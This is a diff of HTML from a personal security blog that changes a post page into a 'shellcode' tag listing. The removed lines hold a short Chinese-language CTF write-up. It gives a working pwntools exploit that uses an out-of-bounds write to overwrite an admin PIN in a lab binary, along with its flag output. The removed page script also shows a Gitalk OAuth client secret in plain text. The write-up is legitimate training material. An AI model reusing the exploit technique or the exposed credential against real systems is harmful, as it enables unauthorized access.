@@ -13,25 +13,20 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/2024/01/19/pwnctf-oob2-writeup/"/>
+    <link rel="canonical" href="https://kazma.tw/tags/shellcode/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="oob2這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示： 123456└─$ .&#x2F;oob2User ID: -4Nickname: kazmaPIN: 1234Logging as [kazma] ... FailedIncorrect PIN code!  那跟上一題基本上解法一樣，我們">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Pwnctf oob2 Writeup">
-<meta property="og:url" content="https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/index.html">
+        <meta name="description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="kazma&#39;s blog">
+<meta property="og:url" content="https://kazma.tw/tags/shellcode/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="oob2這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示： 123456└─$ .&#x2F;oob2User ID: -4Nickname: kazmaPIN: 1234Logging as [kazma] ... FailedIncorrect PIN code!  那跟上一題基本上解法一樣，我們">
+<meta property="og:description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-01-18T16:05:09.000Z">
-<meta property="article:modified_time" content="2024-01-18T16:18:50.128Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="writeup">
-<meta property="article:tag" content="pwn">
-<meta property="article:tag" content="lab">
-<meta property="article:tag" content="pwnctf">
+<meta property="article:tag" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
 <meta name="twitter:card" content="summary">
     
     
@@ -44,7 +39,7 @@
     
     <title>
         
-            Pwnctf oob2 Writeup -
+            Tag: shellcode -
         
         kazma&#39;s blog
     </title>
@@ -184,7 +179,7 @@
                         
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="" 
+                                <a class="active" 
                                     href="/tags"  >
                                     
                                         
@@ -300,7 +295,7 @@
             
                 
                     <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
-                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group active" 
                         href="/tags"  >
                              
                                 
@@ -376,269 +371,46 @@
             <div class="main-content">
 
                 
-                    <div class="post-page-container">
-    <div class="article-content-container">
+                    <div class="tag-container">
+	<div class="tag-name">
+		<i class="fa-solid fa-tag"></i>&nbsp;shellcode
+	</div>
+	<div class="tag-post-list">
+		
 
-        <div class="article-title">
-            
-                <h1 class="article-title-regular">Pwnctf oob2 Writeup</h1>
-            
+<div class="archive-list-container">
+    
+        <section class="archive-item">
+            <div class="archive-item-header">
+                <span class="archive-year">2024</span>
+                <span class="archive-year-post-count">[1]</span>
             </div>
-            
+            <ul class="article-list">
+              
+                
                     
-        
-        
-            <div class="article-header flex flex-row gap-2 items-center">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/kazma.png">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-01-19 00:05:09</span>
-        <span class="mobile">2024-01-19 00:05:09</span>
-        <span class="hover-info">Created</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-01-19 00:18:50</span>
-            <span class="mobile">2024-01-19 00:18:50</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
-
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fa-regular fa-tags"></i>&nbsp;
-            <ul>
+                    <li class="article-item" date-is='06-07'>
                 
-                    <li>
-                        <a href="/tags/writeup/">writeup</a>&nbsp;
-                    </li>
                 
-                    <li>
-                        | <a href="/tags/pwn/">pwn</a>&nbsp;
-                    </li>
+                    <a href="/2024/06/07/Pwnable-tw-Death-Note-Writeup/">
+                        <span class="article-title">Pwnable.tw Death Note Writeup</span>
+                    </a>
                 
-                    <li>
-                        | <a href="/tags/lab/">lab</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/pwnctf/">pwnctf</a>&nbsp;
-                    </li>
-                
+              
             </ul>
-        </span>
-    
-
-    
-    
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+        </section>
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
-
-        
-
-
-        <div class="article-content markdown-body">
-            <h1 id="oob2"><a href="#oob2" class="headerlink" title="oob2"></a>oob2</h1><p>這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob2</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div>
-
-<p>那跟上一題基本上解法一樣，我們原本是 oob read admin 的 pincode 那現在變成是 oob write admin 的 pincode，exploit 如下：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;-4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p32(<span class="number">1</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;kazma&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-<p>Result:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob2&#x27;</span>: pid 14326</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging as [kazma] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;DJPD61GTBQIqqL7sWEvF&#125;</span><br></pre></td></tr></table></figure></div>
-<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>
-        </div>
-
-        
-            <div class="post-copyright-info">
-                <div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> Pwnctf oob2 Writeup</li>
-        <li><strong>Author:</strong> kazma</li>
-        <li><strong>Created at
-                :</strong> 2024-01-19 00:05:09</li>
-        
-            <li>
-                <strong>Updated at
-                    :</strong> 2024-01-19 00:18:50
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/
-        </li>
-        <li>
-            <strong>
-                License:
-            </strong>
-            
-            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
-            
-
-        </li>
-    </ul>
+	</div>
 </div>
 
-            </div>
-        
-
-        
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/writeup/">#writeup</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/pwn/">#pwn</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/lab/">#lab</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/pwnctf/">#pwnctf</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
-
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/02/05/Pwnctf-oob3-Writeup/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Pwnctf oob3 Writeup</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                        rel="next"
-                        href="/2024/01/17/Pwnctf-oob1-Writeup/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Pwnctf oob1 Writeup</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-
-        
-            <div class="comment-container">
-                <div class="comments-container pjax">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fa-solid fa-comments"></i>&nbsp;Comments
-    </div>
-    
-
-        
-            
-    <div id="gitalk-container"></div>
-    <script data-swup-reload-script
-            src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
-    <script data-swup-reload-script>
-
-        function loadGitalk() {
-            let __gitalk__pathname = decodeURI(location.pathname);
-            const __gitalk__pathnameLength = __gitalk__pathname.length;
-            const __gitalk__pathnameMaxLength = 50;
-            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
-                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
-            }
-
-            try {
-                Gitalk && new Gitalk({
-                    clientID: '68fd7e0e6c37358fbb4f',
-                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
-                    repo: 'kazmatw.github.io',
-                    owner: 'kazmatw',
-                    admin: ['kazmatw'],
-                    id: __gitalk__pathname,
-                    language: 'en'
-                }).render('gitalk-container');
-
-            } catch (e) {
-                window.Gitalk = null;
-            }
-        }
-
-        if ('true') {
-            const loadGitalkTimeout = setTimeout(() => {
-                loadGitalk();
-                clearTimeout(loadGitalkTimeout);
-            }, 1000);
-        } else {
-            window.addEventListener('DOMContentLoaded', loadGitalk);
-        }
-    </script>
-
-
-
-        
-    
+<div class="tag-paginator">
+	<div class="paginator">
+    <span class="page-number current">1</span>
 </div>
 
-            </div>
-        
-    </div>
-
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">Pwnctf oob2 Writeup</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#oob2"><span class="nav-text">oob2</span></a></li></ol>
-
-    </div>
 </div>
-        </div>
-    
-</div>
-
 
 
                 
@@ -712,27 +484,6 @@
         </div>
     </div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
-
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
-</div>
-
-        </div>
     
 
     <div class="right-side-tools-container">
